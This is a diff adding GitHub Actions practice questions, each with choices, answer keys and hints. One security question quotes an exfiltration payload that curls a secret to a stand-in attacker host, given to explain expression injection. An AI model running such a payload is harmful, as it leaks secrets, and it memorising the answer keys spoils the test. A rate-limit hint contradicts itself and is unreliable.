+      "scenario": "An organization runs 5,000 workflow runs per day. The platform team needs: aggregate metrics (success rate, average duration, failure trends over time), per-workflow performance tracking (which workflows are getting slower), flaky test detection (tests that pass/fail intermittently), and alerting when a critical workflow's success rate drops below 95% for an hour.",
+      "questionText": "Which observability approach provides comprehensive workflow health monitoring?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Check each workflow run manually in the GitHub UI"
+        },
+        {
+          "letter": "B",
+          "text": "GitHub Actions usage metrics API for raw data, exported to a time-series database (Prometheus/Datadog/CloudWatch), with dashboards showing success rates, duration trends, and failure patterns per workflow, plus alerting rules on success rate thresholds — supplemented by flaky test detection from test result annotations over time"
+        },
+        {
+          "letter": "C",
+          "text": "GitHub organization insights page for high-level overview only"
+        },
+        {
+          "letter": "D",
+          "text": "A weekly email report summarizing workflow runs from the previous week"
+        }
+      ],
+      "correctAnswer": "B",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Export workflow run data to an observability platform for time-series analysis, dashboards, and threshold-based alerting — GitHub's UI alone cannot provide aggregate trends at scale."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "At 5,000 runs/day, aggregate observability requires exporting data: GitHub REST API (GET /repos/{owner}/{repo}/actions/runs) provides run status, duration, and conclusion for each workflow. A scheduled workflow or external service polls this data and writes to a time-series database. Dashboards show: success rate per workflow over time (spot degradation), duration trends (detect slowdowns), and failure correlation (multiple workflows failing = infrastructure issue). Alerting rules fire when success rate &lt; 95% for 1 hour. For flaky tests: aggregate JUnit test results over multiple runs — tests that alternate pass/fail are flagged as flaky. This provides the complete observability stack for CI/CD health."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>GitHub webhook: workflow_run event fires on completion — push-based data collection without polling (lower latency, no rate limits).</li>\n              <li>Datadog GitHub Integration: pre-built dashboards for Actions metrics — out-of-box success rates, duration percentiles, and queue times.</li>\n              <li>Flaky test detection: track test outcomes over N runs — tests failing 20-80% of the time without code changes are flaky.</li>\n              <li>Job-level metrics: /actions/runs/{id}/jobs provides per-job timing — identifies which specific job is causing workflow slowdowns.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Observability",
+        "Metrics",
+        "Monitoring"
+      ]
+    },
+    {
+      "id": 40,
+      "categoryRef": "cat-workflows",
+      "difficulty": "intermediate",
+      "title": "Dynamic Workflow Generation",
+      "scenario": "A platform team needs a workflow that discovers all services in a monorepo (each service has a service.yml manifest), reads each service's configuration (language, test command, deployment target), and dynamically generates a test matrix based on discovered services. New services should be automatically included in CI without modifying the workflow file. The number of services changes frequently (currently 12, growing to 30+).",
+      "questionText": "Which technique enables dynamic, discovery-based workflow execution?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Hardcode all 12 services in the matrix and update manually when new services are added"
+        },
+        {
+          "letter": "B",
+          "text": "A separate workflow file per service maintained by each service team"
+        },
+        {
+          "letter": "C",
+          "text": "A discover job that scans the repository for service.yml files, outputs a JSON array of service configurations, followed by a test job with matrix: ${{ fromJSON(needs.discover.outputs.services) }} — dynamically creating one matrix job per discovered service with service-specific parameters"
+        },
+        {
+          "letter": "D",
+          "text": "A script that generates workflow YAML files and commits them to .github/workflows/"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "fromJSON() in matrix expressions enables dynamic matrices — a discovery job outputs a JSON array that becomes the matrix at runtime."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The discover job scans the repository (find */service.yml, parse each with yq/jq) and constructs a JSON array of objects: [{name: \"auth\", language: \"go\", test_cmd: \"go test ./...\"}, {name: \"api\", language: \"node\", test_cmd: \"npm test\"}, ...]. This array is set as a job output. The test job uses strategy: matrix: service: ${{ fromJSON(needs.discover.outputs.services) }} — GitHub Actions creates one matrix instance per array element. Each instance accesses matrix.service.name, matrix.service.language, etc. When a new service is added (with its service.yml), it's automatically discovered on the next run — zero workflow modifications needed. This scales from 12 to 30+ services without workflow changes."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>fromJSON(): parses a JSON string into a GitHub Actions expression value — works in matrix: for dynamic generation.</li>\n              <li>Matrix from output: needs.discover.outputs.services must be a valid JSON array string (use jq -c for compact JSON).</li>\n              <li>Matrix limit: 256 jobs maximum per matrix — sufficient for 30+ services with headroom.</li>\n              <li>Caching: the discover job is fast (file scan) and enables highly parallel subsequent jobs — optimal for monorepo CI.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Dynamic Matrix",
+        "Discovery",
+        "Monorepo"
+      ]
+    },
+    {
+      "id": 41,
+      "categoryRef": "cat-cicd",
+      "difficulty": "intermediate",
+      "title": "Pull Request Automation",
+      "scenario": "A team wants automated PR management: auto-assign reviewers based on changed files (frontend changes → frontend team, backend → backend team), add labels based on file paths (bug-fix, feature, documentation), post a size warning if the PR exceeds 500 lines changed, auto-merge PRs from Dependabot that pass CI (trusted dependency updates), and close stale PRs that have been inactive for 30 days with a warning comment at 14 days.",
+      "questionText": "Which combination of GitHub features and actions implements comprehensive PR automation?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Manual PR management by a designated team lead"
+        },
+        {
+          "letter": "B",
+          "text": "A single custom GitHub App handling all PR events"
+        },
+        {
+          "letter": "C",
+          "text": "CODEOWNERS file for reviewer assignment, actions/labeler for path-based labeling, a size-check step using github-script for line count warning, dependabot auto-merge configuration with auto-merge enabled on passing checks, and actions/stale for inactive PR management with 14-day warning and 30-day close"
+        },
+        {
+          "letter": "D",
+          "text": "Branch protection rules with required reviewers for all automation needs"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Each requirement maps to a specific GitHub feature or action: CODEOWNERS, labeler, github-script, auto-merge, and stale — combine for comprehensive PR automation."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "CODEOWNERS file (.github/CODEOWNERS) maps file patterns to teams: /frontend/** @org/frontend-team, /backend/** @org/backend-team — GitHub automatically requests reviews from matching teams. actions/labeler adds labels based on a configuration mapping file paths to labels. A PR workflow step uses github-script to check context.payload.pull_request.additions + deletions, posting a comment if &gt;500 lines. Dependabot auto-merge: configure dependabot.yml with open-pull-requests-limit and use gh pr merge --auto in a workflow triggered on dependabot PRs that pass CI. actions/stale identifies inactive PRs, comments at 14 days (\"This PR has been inactive...\"), and closes at 30 days. Each tool handles one concern cleanly."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>CODEOWNERS: requires branch protection \"Require review from Code Owners\" to be enforceable — otherwise it's just a suggestion.</li>\n              <li>actions/labeler: .github/labeler.yml defines rules like \"frontend: ['frontend/**']\" — labels applied on PR open and synchronize.</li>\n              <li>Auto-merge: repository setting must be enabled; then PRs with auto-merge set merge automatically when all required checks pass and reviews are approved.</li>\n              <li>actions/stale: configurable days-before-stale, days-before-close, exempt-labels (e.g., \"in-progress\" PRs are never marked stale).</li></ul>"
+        }
+      ],
+      "tags": [
+        "PR Automation",
+        "CODEOWNERS",
+        "Labels"
+      ]
+    },
+    {
+      "id": 42,
+      "categoryRef": "cat-actions",
+      "difficulty": "intermediate",
+      "title": "Action Testing and CI",
+      "scenario": "A team maintains a widely-used composite action. They need: unit tests for the action's logic (input validation, output generation), integration tests that verify the action works correctly within a real workflow, testing across runner OS types (Ubuntu, Windows, macOS), and automated release creation when tests pass on the main branch. The action itself needs CI just like any other codebase.",
+      "questionText": "Which testing strategy provides comprehensive quality assurance for a GitHub Action?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Test the action manually by running it in a test repository before each release"
+        },
+        {
+          "letter": "B",
+          "text": "Only test in consumer repositories after release — fix issues in patch releases"
+        },
+        {
+          "letter": "C",
+          "text": "CI workflow in the action's repository: unit tests (Jest for JS actions, or script-based for composite), integration test workflow that calls the action locally (uses: ./) with known inputs and asserts expected outputs, matrix strategy testing on [ubuntu-latest, windows-latest, macos-latest], and automated release workflow triggered on main branch push after all tests pass"
+        },
+        {
+          "letter": "D",
+          "text": "Code review only without automated testing"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Actions need CI too: unit tests for logic, integration tests using uses: ./ (self-referencing), cross-OS matrix, and automated release on green."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The action's own CI workflow tests it thoroughly: Unit tests (Jest for JavaScript actions) test individual functions (input parsing, output formatting, API call logic) with mocked dependencies. Integration tests use uses: ./ (references the action from the current repository checkout) with known inputs, then assert outputs match expected values using if: steps.test.outputs.result != 'expected'. Matrix strategy runs both unit and integration tests on all three OS types. The release workflow: triggered on push to main, after all tests pass, creates a GitHub Release with semantic version tag (from conventional commits or manual version bump) — ensuring only tested code is released. This is the same quality bar as any production codebase."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>uses: ./ references the action from the repository root of the current checkout — enables testing the action in the same CI that develops it.</li>\n              <li>For JavaScript actions: mock @actions/core and @actions/github in Jest tests — test logic without GitHub API side effects.</li>\n              <li>Output assertion: steps.test-action.outputs.my_output in subsequent step's if: condition validates the action produced correct outputs.</li>\n              <li>act (nektos/act): local GitHub Actions runner emulator — enables running workflow tests on developer machines before pushing.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Action Testing",
+        "CI for Actions",
+        "Quality"
+      ]
+    },
+    {
+      "id": 43,
+      "categoryRef": "cat-security",
+      "difficulty": "intermediate",
+      "title": "Workflow Security Hardening",
+      "scenario": "A public repository accepts contributions from external developers via PRs. Security concerns: PR workflows triggered by pull_request_target have write permissions and access to secrets (unlike pull_request), malicious PRs could modify workflow files to exfiltrate secrets, and expression injection via crafted PR titles or branch names containing ${{ }} syntax could execute arbitrary commands.",
+      "questionText": "Which security measures protect against these workflow exploitation vectors?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Disable all CI for external PRs"
+        },
+        {
+          "letter": "B",
+          "text": "Use pull_request (not pull_request_target) for untrusted code execution, never use PR-controlled data (title, body, branch name) directly in run: expressions without sanitization, pin all actions to SHA, and if pull_request_target is needed, only checkout the base branch (not the PR head) for any code that runs with elevated permissions"
+        },
+        {
+          "letter": "C",
+          "text": "Trust all contributors since the repository is public"
+        },
+        {
+          "letter": "D",
+          "text": "Require all external contributors to sign a CLA before their PRs trigger workflows"
+        }
+      ],
+      "correctAnswer": "B",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Never run untrusted code with elevated permissions, never interpolate user-controlled strings into run: expressions, and keep secrets away from fork PRs."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "pull_request trigger runs with read-only permissions and no secrets access for fork PRs — safe for untrusted code. pull_request_target runs in the context of the base branch (write access, secrets available) — NEVER checkout the PR head ref when using this trigger (a malicious PR could modify the checked-out code). Expression injection: if a PR title contains ${{ github.event.pull_request.title }} in a run: step, it's interpolated before shell execution — crafted titles like \"; curl attacker.com?s=$SECRET;\" execute arbitrary commands. Mitigation: assign to an environment variable first (env: TITLE: ${{ ... }}) and reference $TITLE in the script. SHA pinning prevents compromised action tags from injecting code."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Expression injection: ${{ }} is evaluated by Actions BEFORE the shell sees the command — it's template injection, not shell injection.</li>\n              <li>Safe pattern: env: PR_TITLE: ${{ github.event.pull_request.title }} then run: echo \"$PR_TITLE\" — the env var is properly quoted by the shell.</li>\n              <li>pull_request_target + checkout PR head = giving write access + secrets to attacker-controlled code — critical vulnerability.</li>\n              <li>Workflow approval for first-time contributors: organization setting requiring manual approval before workflows run for new contributors.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Workflow Security",
+        "Injection",
+        "Hardening"
+      ]
+    },
+    {
+      "id": 44,
+      "categoryRef": "cat-admin",
+      "difficulty": "intermediate",
+      "title": "GitHub Actions for GitHub Enterprise",
+      "scenario": "A company uses GitHub Enterprise Server (GHES) on-premises. They want to use GitHub Actions but have restrictions: no internet access from the build environment (air-gapped network), need to host action code internally (cannot pull from github.com), must use self-hosted runners on their own infrastructure, and want to mirror commonly-used actions from github.com for internal use.",
+      "questionText": "Which configuration enables GitHub Actions in an air-gapped GHES environment?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Connect GHES to github.com via a proxy for action downloads"
+        },
+        {
+          "letter": "B",
+          "text": "Disable Actions entirely and use Jenkins for CI/CD"
+        },
+        {
+          "letter": "C",
+          "text": "Use GitHub.com hosted runners that VPN back to the enterprise network"
+        },
+        {
+          "letter": "D",
+          "text": "Self-hosted runners on internal infrastructure, actions-sync tool to mirror actions from github.com to the internal GHES instance, internal action repositories for custom actions, and pre-cached tool versions on runners (since setup-* actions cannot download from internet)"
+        }
+      ],
+      "correctAnswer": "D",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Air-gapped GHES: self-hosted runners (no hosted runners available), mirrored actions (no github.com access), and pre-cached tools (no internet downloads)."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "In an air-gapped GHES deployment: Self-hosted runners are the only option (GitHub-hosted runners are a github.com service). The actions-sync tool (github.com/actions/actions-sync) mirrors popular actions (actions/checkout, actions/cache, setup-node, etc.) from github.com to the internal GHES instance — workflows reference the internal mirror. Custom actions live in internal repositories on the GHES instance. Tool caches (Node.js, Python, Go binaries) must be pre-populated on runners or in an internal mirror since setup-* actions normally download from the internet. Runner images are built with all required tools pre-installed, eliminating runtime internet dependency."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>actions-sync: CLI tool that clones action repos from github.com and pushes to GHES — handles both code and releases/tags.</li>\n              <li>Tool cache: RUNNER_TOOL_CACHE directory pre-populated with Node.js, Python, etc. — setup-* actions check here before downloading.</li>\n              <li>GHES Actions: requires blob storage (Azure Blob, S3, or MinIO) for workflow logs and artifacts.</li>\n              <li>Internal action marketplace: GHES supports an internal actions browsing experience — users discover internal actions within the enterprise.</li></ul>"
+        }
+      ],
+      "tags": [
+        "GHES",
+        "Air-Gapped",
+        "Enterprise"
+      ]
+    },
+    {
+      "id": 45,
+      "categoryRef": "cat-workflows",
+      "difficulty": "intermediate",
+      "title": "Composite Workflow Patterns",
+      "scenario": "A complex CI/CD pipeline needs coordination between multiple workflows: a build workflow that produces artifacts, a security scan workflow that analyzes the artifacts, a deploy workflow that uses scan-approved artifacts, and a notification workflow that reports the outcome of the entire pipeline. Each workflow has different triggers and may need to wait for others.",
+      "questionText": "Which pattern coordinates multiple dependent workflows into a pipeline?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "All logic in a single massive workflow file"
+        },
+        {
+          "letter": "B",
+          "text": "Cron schedules aligned so workflows run in the correct order by timing"
+        },
+        {
+          "letter": "C",
+          "text": "workflow_run trigger chaining: build triggers on push, security-scan triggers on workflow_run (workflow: build, types: completed, conclusion: success), deploy triggers on workflow_run (workflow: security-scan, conclusion: success) with environment approval gate, and notify triggers on workflow_run (workflow: deploy) for both success and failure outcomes — passing artifacts between workflows via the triggering workflow's artifacts"
+        },
+        {
+          "letter": "D",
+          "text": "Manual triggering of each workflow in sequence by a release manager"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "workflow_run trigger creates event-driven chains between workflows — each workflow runs when its predecessor completes with the expected conclusion."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "workflow_run enables workflow chaining: the security-scan workflow triggers when the build workflow completes successfully (on: workflow_run: workflows: [\"Build\"], types: [completed], filtering on conclusion via if: github.event.workflow_run.conclusion == 'success'). The deploy workflow similarly triggers after security-scan succeeds. Artifacts from the triggering workflow are accessible via the workflow_run event (github.event.workflow_run.id allows downloading artifacts from the parent run). The notification workflow triggers on both success and failure of deploy to report either outcome. This creates a DAG of workflows without coupling them into a single file — each is independently maintainable, testable, and has clear responsibility boundaries."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>workflow_run only triggers for workflows on the default branch — feature branch workflows don't trigger the chain.</li>\n              <li>Artifact access: use actions/download-artifact@v4 with github-token and run-id from github.event.workflow_run.id for cross-workflow artifact sharing.</li>\n              <li>Conclusion filter: check github.event.workflow_run.conclusion in an if: condition — values: success, failure, cancelled, skipped.</li>\n              <li>Limitation: workflow_run adds seconds of delay between workflows (event processing time) — not suitable for sub-second coordination.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Workflow Chaining",
+        "workflow_run",
+        "Pipeline"
+      ]
+    },
+    {
+      "id": 46,
+      "categoryRef": "cat-cicd",
+      "difficulty": "intermediate",
+      "title": "Multi-Cloud Deployment",
+      "scenario": "A SaaS product deploys to both AWS (primary) and GCP (disaster recovery). The deployment workflow must: build once (single container image), push to both ECR (AWS) and Artifact Registry (GCP), deploy to EKS (AWS) and GKE (GCP) with environment-specific configurations, and verify health in both clouds before marking the deployment as complete. Authentication must use OIDC for both clouds (no stored credentials).",
+      "questionText": "Which workflow architecture deploys to both clouds with OIDC authentication?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Two completely separate workflows — one per cloud — triggered independently"
+        },
+        {
+          "letter": "B",
+          "text": "Deploy to AWS first, then replicate the entire deployment to GCP using a migration tool"
+        },
+        {
+          "letter": "C",
+          "text": "Single workflow: build job (produces image), parallel deploy jobs (deploy-aws and deploy-gcp) each with OIDC authentication to their respective cloud (separate IAM role/workload identity configurations), push image to both registries, apply Kubernetes manifests to both clusters, and a final health-check job that verifies both deployments (needs: [deploy-aws, deploy-gcp])"
+        },
+        {
+          "letter": "D",
+          "text": "Use a multi-cloud deployment platform (Spinnaker) triggered by the workflow"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Build once, deploy to both clouds in parallel with separate OIDC credentials, then verify both — single workflow with cloud-specific jobs."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Single workflow provides coordination: The build job creates one container image. Two parallel deploy jobs (needs: [build]) authenticate independently: deploy-aws uses aws-actions/configure-aws-credentials with OIDC (role-to-assume), deploy-gcp uses google-github-actions/auth with workload_identity_provider. Each pushes the same image to their respective registry (ECR/Artifact Registry) and applies environment-specific Kubernetes manifests (different configs per cloud via kustomize overlays or Helm values). A health-check job (needs: [deploy-aws, deploy-gcp]) verifies both deployments are healthy before marking the workflow as successful. OIDC for both means zero stored cloud credentials."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>OIDC for GCP: google-github-actions/auth with workload_identity_provider and service_account — maps GitHub identity to GCP service account.</li>\n              <li>Image retagging: build once (ghcr.io/org/app:sha), then tag+push to ECR and Artifact Registry — avoids building twice.</li>\n              <li>Kubernetes config per cloud: Helm values files (values-aws.yaml, values-gcp.yaml) or kustomize overlays handle cloud-specific settings.</li>\n              <li>Parallel deploys: both clouds deploy simultaneously (no needs: between them) — total deployment time = max(aws_time, gcp_time), not sum.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Multi-Cloud",
+        "OIDC",
+        "Deployment"
+      ]
+    },
+    {
+      "id": 47,
+      "categoryRef": "cat-actions",
+      "difficulty": "intermediate",
+      "title": "GitHub Packages Integration",
+      "scenario": "A team publishes multiple npm packages from a monorepo. Their workflow needs to: determine which packages changed since the last release, version each changed package independently (following conventional commits), publish changed packages to GitHub Packages (npm registry), and ensure package consumers can install both public and organization-private packages from the same scope.",
+      "questionText": "Which workflow handles independent package versioning and publishing from a monorepo?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Publish all packages on every merge regardless of changes"
+        },
+        {
+          "letter": "B",
+          "text": "Manual version bumping in each package.json before merge"
+        },
+        {
+          "letter": "C",
+          "text": "Changesets or Lerna-based workflow: detect changed packages, determine version bumps per-package from commit messages, publish only changed packages to GitHub Packages npm registry (registry-url: https://npm.pkg.github.com) using GITHUB_TOKEN, with package.json publishConfig pointing to GitHub Packages scope"
+        },
+        {
+          "letter": "D",
+          "text": "Publish to npmjs.com only — GitHub Packages not used"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Changesets/Lerna handle per-package versioning in monorepos; GitHub Packages npm registry provides scoped package hosting authenticated via GITHUB_TOKEN."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Changesets (or Lerna) manage independent package versioning in monorepos: each PR includes a changeset file describing what changed and the version bump type. On merge to main, the workflow: consumes changesets to determine which packages need new versions, bumps package.json versions independently, generates per-package changelogs, and runs npm publish for each changed package. Publishing to GitHub Packages (registry-url: https://npm.pkg.github.com in setup-node) uses GITHUB_TOKEN for authentication — no additional secrets needed for same-organization packages. Package consumers add the scope to their .npmrc: @org:registry=https://npm.pkg.github.com. Private packages are accessible to organization members; public packages are accessible to anyone."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>GitHub Packages npm: packages are scoped to the repository owner (@org/package-name). GITHUB_TOKEN has packages:write for publishing.</li>\n              <li>Changesets: PR-based workflow — developers add changesets during PR, a \"Version Packages\" PR is auto-created, merging it triggers publish.</li>\n              <li>Consumer auth: .npmrc with //npm.pkg.github.com/:_authToken=${GITHUB_TOKEN} for CI consumers; PAT for local development.</li>\n              <li>Mixed registries: packages can install from both npmjs.com (default) and GitHub Packages (scoped) simultaneously via .npmrc configuration.</li></ul>"
+        }
+      ],
+      "tags": [
+        "GitHub Packages",
+        "npm",
+        "Monorepo Publishing"
+      ]
+    },
+    {
+      "id": 48,
+      "categoryRef": "cat-security",
+      "difficulty": "intermediate",
+      "title": "Environment Deployment Protection Rules",
+      "scenario": "A compliance-regulated company needs deployment gates beyond simple reviewer approval: deployments to production must only occur during business hours (9 AM - 5 PM weekdays), a third-party change management system (ServiceNow) must have an approved change request, and the deployment must pass an external security validation API before proceeding. Standard GitHub environment protection rules (reviewers, wait timer) are insufficient.",
+      "questionText": "Which feature extends environment protection beyond built-in rules?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Custom deployment protection rules — GitHub Apps that implement the deployment protection rule API, receiving callbacks before deployments proceed and responding with approve/reject based on external validation (business hours check, ServiceNow approval status, security API result)"
+        },
+        {
+          "letter": "B",
+          "text": "Branch protection rules with additional checks"
+        },
+        {
+          "letter": "C",
+          "text": "A manual checklist in the PR description that reviewers must verify"
+        },
+        {
+          "letter": "D",
+          "text": "A pre-deployment workflow that checks conditions and fails if not met"
+        }
+      ],
+      "correctAnswer": "A",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Custom deployment protection rules allow GitHub Apps to gate deployments based on arbitrary external conditions — extending beyond built-in reviewers and timers."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Custom deployment protection rules are implemented as GitHub Apps that register as deployment protection rule providers. When a workflow job references a protected environment, GitHub calls each registered protection rule App's webhook endpoint with the deployment details. The App evaluates its custom logic (check current time for business hours, query ServiceNow API for approved change request, call security validation API) and responds with approved or rejected status plus a message. All registered rules must approve before the deployment job proceeds. This enables arbitrary external gates: change management systems, security tools, compliance checks, and time-based restrictions — all integrated into GitHub's native deployment flow."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Custom deployment protection rules: GitHub App receives deployment_protection_rule webhook, responds via POST /repos/.../actions/runs/.../deployment_protection_rule.</li>\n              <li>Multiple rules: an environment can have multiple custom rules — ALL must approve (logical AND). Combined with built-in rules (reviewers + timer).</li>\n              <li>Timeout: custom rules have a maximum response time (default 30 minutes) — if no response, the deployment is rejected.</li>\n              <li>Use cases: ServiceNow integration, PagerDuty incident check (don't deploy during outage), feature flag validation, regulatory compliance checks.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Deployment Protection",
+        "Custom Rules",
+        "Compliance"
+      ]
+    },
+    {
+      "id": 49,
+      "categoryRef": "cat-admin",
+      "difficulty": "intermediate",
+      "title": "Workflow Templates and Starter Workflows",
+      "scenario": "An organization wants to provide standardized workflow starting points for common project types: Node.js web apps, Python data science projects, Go microservices, and mobile apps. When developers create a new repository or click \"New workflow,\" they should see organization-specific templates pre-configured with the team's tooling (specific linting rules, required security scans, internal artifact registries). Templates should be maintainable centrally but customizable per repository.",
+      "questionText": "Which mechanism provides organization-level workflow templates discoverable by all repositories?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "A wiki page with copy-paste workflow snippets"
+        },
+        {
+          "letter": "B",
+          "text": "Template repositories that developers fork when starting new projects"
+        },
+        {
+          "letter": "C",
+          "text": "Starter workflows in the organization's .github repository: workflow templates in .github/workflow-templates/ with companion properties.json files defining name, description, icon, categories, and file patterns for auto-suggestion — visible to all repos in the \"Actions\" tab \"New workflow\" page"
+        },
+        {
+          "letter": "D",
+          "text": "Required workflows that enforce a single workflow on all repositories regardless of type"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Starter workflows in .github/workflow-templates/ appear as templates when any org repository creates a new workflow — discoverable and customizable."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The organization's .github repository contains .github/workflow-templates/ directory with: workflow YAML files (node-ci.yml, python-ci.yml, go-ci.yml, mobile-ci.yml) pre-configured with internal tooling, and companion .properties.json files specifying: name, description, iconName, categories ([\"Node.js\", \"CI\"]), and filePatterns ([\"package.json\"] for auto-suggestion when a repo contains that file). When developers in any org repo click \"Actions\" → \"New workflow,\" they see these templates alongside GitHub's built-in suggestions. Selecting one creates a copy in the repository that developers can customize. The template serves as a starting point — not enforced, but strongly suggested with best practices baked in."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>filePatterns: if a repo contains a matching file (e.g., package.json), that template is suggested first — intelligent auto-suggestion.</li>\n              <li>$default-branch variable: use in templates for branch references — replaced with the repo's actual default branch on adoption.</li>\n              <li>Distinction: starter workflows are voluntary templates; required workflows (via rulesets) are mandatory injected jobs — different governance levels.</li>\n              <li>Maintenance: update templates in .github repo — existing repos that already adopted them are NOT updated (they have their own copy). Only new adoptions get the latest version.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Starter Workflows",
+        "Templates",
+        "Organization"
+      ]
+    },
+    {
+      "id": 50,
+      "categoryRef": "cat-workflows",
+      "difficulty": "intermediate",
+      "title": "GitHub Actions REST API",
+      "scenario": "A platform team builds an internal developer portal that needs to: trigger workflows programmatically (on-demand provisioning, scheduled tasks), monitor workflow run status across all organization repositories, cancel long-running workflows that exceed time budgets, and download workflow artifacts for integration with internal systems. All operations must be authenticated and auditable.",
+      "questionText": "Which API capabilities enable programmatic workflow management for the developer portal?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "SSH into runners and manage processes directly"
+        },
+        {
+          "letter": "B",
+          "text": "GitHub CLI (gh) running on a shared server with a stored PAT"
+        },
+        {
+          "letter": "C",
+          "text": "GitHub REST API with a GitHub App (installation token) for authentication: POST /repos/.../actions/workflows/.../dispatches to trigger, GET /repos/.../actions/runs for status monitoring, POST /repos/.../actions/runs/.../cancel to abort, and GET /repos/.../actions/artifacts/.../zip for downloads — all auditable via the app's installation log"
+        },
+        {
+          "letter": "D",
+          "text": "Webhooks only — no programmatic triggering or management possible"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "The GitHub REST API provides full programmatic control over workflows — GitHub Apps provide secure, auditable, scoped authentication for automation platforms."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The GitHub REST API provides complete workflow management: POST .../dispatches triggers workflow_dispatch-enabled workflows with custom inputs. GET .../runs lists runs with filtering (status, branch, event, actor). POST .../runs/{id}/cancel stops a running workflow. GET .../artifacts/{id}/zip downloads artifacts programmatically. Authentication via GitHub App installation token: the App is installed on the organization with actions:write and actions:read permissions. Installation tokens are short-lived (1 hour), scoped to specific repositories, and all API calls are auditable under the App's identity. This is more secure than PATs (long-lived, personal) for platform automation."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>GitHub App permissions: actions (read/write for run management), contents (read for triggering on specific refs), metadata (read, always required).</li>\n              <li>Installation tokens: JWT → installation token exchange. Tokens expire in 1 hour — platform must handle refresh.</li>\n              <li>Rate limits: GitHub App installation tokens get 5,000 requests/hour (higher than PATs at 5,000/hour for the user).</li>\n              <li>Webhook complement: use workflow_run webhooks for push-based status updates (more efficient than polling GET .../runs for status changes).</li></ul>"
+        }
+      ],
+      "tags": [
+        "REST API",
+        "GitHub App",
+        "Automation"
+      ]
+    }
+  ],
+  "glossary": {}
+}
